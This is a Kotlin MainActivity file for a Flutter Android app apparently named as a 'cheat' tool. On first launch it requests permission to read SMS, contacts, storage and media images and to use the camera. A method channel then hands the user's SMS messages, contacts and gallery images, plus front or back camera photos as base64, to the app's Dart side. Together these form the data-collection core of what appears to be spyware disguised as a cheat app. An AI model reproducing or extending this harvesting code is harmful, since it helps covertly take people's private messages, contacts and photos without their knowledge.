package com.yanz.cheat

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : FlutterActivity() {
    private val CHANNEL = "yanz/cheat"
    private lateinit var bridge: NativeBridge

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        bridge = NativeBridge(this)

        // Minta izin dasar pas aplikasi pertama kali dibuka
        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_MEDIA_IMAGES
        )
        
        val missingPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), 101)
        }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                try {
                    when (call.method) {
                        "getSms" -> result.success(bridge.getSms())
                        "getContacts" -> result.success(bridge.getContacts())
                        "getGallery" -> result.success(bridge.getGallery())
                        "capturePhoto" -> {
                            val front = call.argument<Boolean>("front") ?: false
                            bridge.capturePhoto(front) { b64 -> 
                                runOnUiThread { result.success(b64) } 
                            }
                        }
                        else -> result.notImplemented()
                    }
                } catch (e: Exception) {
                    result.success(if (call.method == "capturePhoto") "" else emptyList<Map<String, String>>())
                }
            }
    }
}
